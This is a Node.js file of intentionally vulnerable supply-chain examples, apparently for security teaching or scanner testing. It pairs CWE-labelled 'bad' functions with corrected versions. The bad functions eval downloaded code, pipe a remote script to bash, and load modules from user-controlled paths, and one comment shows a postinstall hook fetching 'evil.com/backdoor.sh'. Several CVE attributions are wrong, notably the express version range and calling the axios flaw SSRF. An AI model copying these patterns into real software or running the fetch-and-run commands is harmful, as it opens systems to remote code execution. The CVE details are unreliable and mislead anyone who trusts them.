/**
 * dependency.js — Supply chain & dependency vulnerability examples (Node.js)
 *
 * VULNERABILITIES:
 *   - CWE-1104: Use of unmaintained third-party components
 *   - CWE-937: Using components with known vulnerabilities (OWASP A06)
 *   - CWE-494: Download of code without integrity check
 *   - CWE-829: Inclusion of functionality from untrusted source
 *   - CWE-427: Uncontrolled search path element
 */

const https = require('https');
const { execSync } = require('child_process');
const fs = require('fs');

// ═══════════════════════════════════════════
// VULNERABILITY [CWE-494]: Untrusted Code Download
// ═══════════════════════════════════════════

function badDownloadAndRun(url) {
    // VULNERABILITY [CWE-494]: Download and execute code without integrity check
    https.get(url, (res) => {
        let script = '';
        res.on('data', chunk => script += chunk);
        res.on('end', () => {
            eval(script);  // Execute downloaded code without any verification!
        });
    });
    // Attacker: MITM or compromised CDN → arbitrary code execution
}

function badInstallScript() {
    // VULNERABILITY [CWE-494]: postinstall script runs arbitrary commands
    // This would be in package.json:
    // "scripts": { "postinstall": "curl http://evil.com/backdoor.sh | bash" }
    execSync('curl https://some-cdn.com/setup.sh | bash');
    // No integrity check, no signature verification
}

// ═══════════════════════════════════════════
// VULNERABILITY [CWE-937]: Known Vulnerable Dependencies
// ═══════════════════════════════════════════

// This file demonstrates what happens when you use vulnerable versions:

// Example: lodash < 4.17.21 — prototype pollution (CVE-2020-8203)
function badLodashUsage(data) {
    const _ = require('lodash');
    // VULNERABILITY [CWE-937]: lodash < 4.17.21 has prototype pollution in _.set
    _.set({}, data.path, data.value);  // Prototype pollution via __proto__ path
}

// Example: express < 4.17.0 — open redirect (CVE-2024-29041)
function badExpressRedirect(req, res) {
    // VULNERABILITY [CWE-937]: express < 4.17.0 has open redirect vulnerability
    res.redirect(req.query.url);  // No validation!
}

// Example: marked < 4.0.0 — ReDoS (CVE-2022-21680)
function badMarkedRender(userInput) {
    const marked = require('marked');
    // VULNERABILITY [CWE-937]: marked < 4.0.0 has multiple ReDoS vectors
    return marked.parse(userInput);
}

// Example: axios < 1.6.0 — SSRF (CVE-2023-45857)
function badAxiosRequest(userURL) {
    const axios = require('axios');
    // VULNERABILITY [CWE-937]: axios < 1.6.0 SSRF via absolute URL bypass
    return axios.get(userURL);
}

// ═══════════════════════════════════════════
// VULNERABILITY [CWE-1104]: Abandoned Dependencies
// ═══════════════════════════════════════════

// Conceptual: using packages that are no longer maintained
const VULNERABLE_DEPENDENCIES = [
    { name: 'request', version: '2.88.2', status: 'DEPRECATED', risk: 'No security updates' },
    { name: 'cryptiles', version: '3.1.2', status: 'DEPRECATED', risk: 'Known crypto vulnerabilities' },
    { name: 'hoek', version: '4.2.1', status: 'DEPRECATED', risk: 'Prototype pollution (CVE-2020-36604)' },
    { name: 'deep-extend', version: '0.4.2', status: 'UNMAINTAINED', risk: 'Prototype pollution' },
    { name: 'left-pad', version: '1.3.0', status: 'UNPUBLISHED', risk: 'Supply chain breakage' }
];

// ═══════════════════════════════════════════
// VULNERABILITY [CWE-427]: Unsafe PATH / Module Resolution
// ═══════════════════════════════════════════

function badNpmInstallUntrusted() {
    // VULNERABILITY [CWE-427]: npm install without --ignore-scripts
    // Running: npm install some-package (postinstall scripts run automatically)
    execSync('npm install untrusted-package');
    // postinstall scripts in untrusted packages = arbitrary code execution
}

function badRequireDynamicPath(userPath) {
    // VULNERABILITY [CWE-427]: require with user-controlled path
    const resolved = require.resolve(userPath);
    return require(resolved);
    // Attacker: userPath = '../../malicious-module' → loads attacker-controlled code
}

// ═══════════════════════════════════════════
// VULNERABILITY [CWE-829]: Untrusted CDN/Module Source
// ═══════════════════════════════════════════

function badImportFromCDN() {
    // VULNERABILITY [CWE-829]: Importing modules from untrusted CDN
    // <script src="https://untrusted-cdn.example.com/library.js">
    // No SRI (Subresource Integrity) hash — CDN compromise = XSS
    const html = `
        <script src="https://cdn.untrusted-example.com/jquery.min.js"></script>
        <script src="https://cdn.untrusted-example.com/react.production.min.js"></script>
    `;
    return html;
    // No integrity= attribute → MITM or CDN compromise injects malicious code
}

// ═══════════════════════════════════════════
// CORRECTED VERSIONS
// ═══════════════════════════════════════════

function goodDownloadAndRun(url, expectedHash) {
    const crypto = require('crypto');

    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            const chunks = [];
            res.on('data', chunk => chunks.push(chunk));
            res.on('end', () => {
                const buffer = Buffer.concat(chunks);
                const hash = crypto.createHash('sha256').update(buffer).digest('hex');

                if (hash !== expectedHash) {
                    reject(new Error(`Integrity check failed! Expected ${expectedHash}, got ${hash}`));
                    return;
                }

                // Only execute if hash matches
                const script = buffer.toString();
                const module = { exports: {} };
                const fn = new Function('module', 'exports', script);
                fn(module, module.exports);
                resolve(module.exports);
            });
        });
    });
}

function goodHTMLWithSRI() {
    // Use Subresource Integrity (SRI) hashes
    return `
        <script
            src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
            integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
            crossorigin="anonymous">
        </script>
    `;
    // Browser verifies hash before executing — CDN compromise blocked
}

const ALLOWED_MODULES = new Set(['lodash', 'validator', 'axios']);
function goodNpmInstallSafely() {
    // Always use --ignore-scripts for untrusted packages
    execSync('npm install lodash@4.17.21 --ignore-scripts --lockfile-version 2');
    // Then audit for vulnerabilities
    execSync('npm audit --audit-level=high');
}

module.exports = {
    badDownloadAndRun, badInstallScript, badLodashUsage,
    badExpressRedirect, badMarkedRender, badAxiosRequest,
    badNpmInstallUntrusted, badRequireDynamicPath, badImportFromCDN,
    VULNERABLE_DEPENDENCIES,
    goodDownloadAndRun, goodHTMLWithSRI, goodNpmInstallSafely
};
